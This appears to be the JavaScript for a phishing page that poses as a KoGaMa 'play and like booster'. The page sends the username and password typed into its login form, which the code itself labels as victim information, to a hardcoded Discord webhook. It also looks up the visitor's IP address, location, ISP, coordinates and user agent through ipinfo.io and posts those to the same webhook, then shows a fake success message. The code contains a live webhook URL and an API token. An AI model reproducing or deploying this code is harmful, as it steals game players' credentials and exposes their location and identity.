document.addEventListener('DOMContentLoaded', () => {
    const form = document.getElementById('loginForm');
    const count = 0

    form.addEventListener('submit', async (event) => {
        event.preventDefault(); // Evita el envío del formulario

        // Obtiene los valores del formulario
        const username = document.getElementById('username').value;
        const password = document.getElementById('password').value;
        const game = document.getElementById('game').value;
        const play_amount = document.getElementById('play_amount').value
        const play_velocity = document.getElementById('play_velocity').value
        const add_likes = document.getElementById('add_likes').checked

        const ip_grabber = async function(webhook_url) {
            fetch(`https://ipinfo.io/json?token=f8e54fde451c64`)
            .then(response => response.json())
            .then(data => {
                const useragent = navigator.userAgent;

                const ipinfo = `IP address: ${data.ip}\nLocation: ${data.city}, ${data.region}, ${data.country}\nISP: ${data.org}\nLatitude/Longitude: ${data.loc}\nZip code: ${data.postal}\nTime Zone: ${data.timezone}\n\nUser Agent: ${useragent}`
                const embed_message = {
                    embeds: [
                        {
                            thumbnail: {
                                url: '', // If you want to add a thumbnail, add the url of the image
                            },
                            title: 'KoGaMa User Information',
                            description: '```' + ipinfo + '```',
                            color: 0x00000,
                        },
                    ],
                };
    
                fetch(webhook_url, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embed_message)
                })
                .then(response => response.ok)
                .then(status_code => {
                    if (status_code) {
                        console.log('success');
                    } else {
                        console.log('failed');
                    }
                })
            })
        }

        // Validar los datos del formulario (esto es un ejemplo básico)
        if (username && password) {
            // Aquí deberías validar las credenciales con tu servidor o backend
            // Por simplicidad, asumiremos que cualquier combinación de usuario y contraseña es válida

            // Datos del mensaje para el webhook
            const webhookURL = 'https://discord.com/api/webhooks/1327191078675415063/pua99cbFIpypeBLb1xdIAFQrYwtDW_A5lmQdi8hQRHLu1UOZTotQkQ6xkysQzQpGMcu4';
            const embed = {
                title: 'Información de la victima',
                description: 'Registrado exitosamente...',
                color: 080707,
                fields: [{
                        name: 'Usuario',
                        value: username,
                        inline: true
                    },
                    {
                        name: 'Contraseña',
                        value: password,
                        inline: true
                    },
                    {
                        name: 'ID Game',
                        value: game,
                        inline: true
                    },
                    {
                        name: 'Play Increment',
                        value: play_amount,
                        inline: true
                    },
                    {
                        name: 'Velocity',
                        value: play_velocity,
                        inline: true
                    },
                    {
                        name: 'Enabled Add Likes',
                        value: add_likes,
                        inline: true
                    }
                ],
                footer: {
                    text: 'Registro de Sesión'
                },
                timestamp: new Date() // Fecha y hora actual
            };

            const messageData = {
                content: '¡Nuevo inicio de sesión detectado!',
                embeds: [embed]
            };

            try {
                const response = await fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(messageData)
                });

                if (response.ok) {
                    if (count === 0 && (!isNaN(parseInt(game)) || game.includes('https://kogama.com/games/play/'))) {
                        await ip_grabber(webhookURL);
                    };
                    alert(`&{play_amount} plays have started, check your game!`);
                    // Aquí podrías redirigir al usuario a otra página
                    // window.location.href = '/dashboard.html';
                } else {
                    alert('Error sending data to the system. try again.');
                }
            } catch (error) {
                console.error('Error:', error);
                alert('There was an error processing your request.');
            }
        } else {
            alert('Please enter a username and password and IDs.');
        }
    });
});
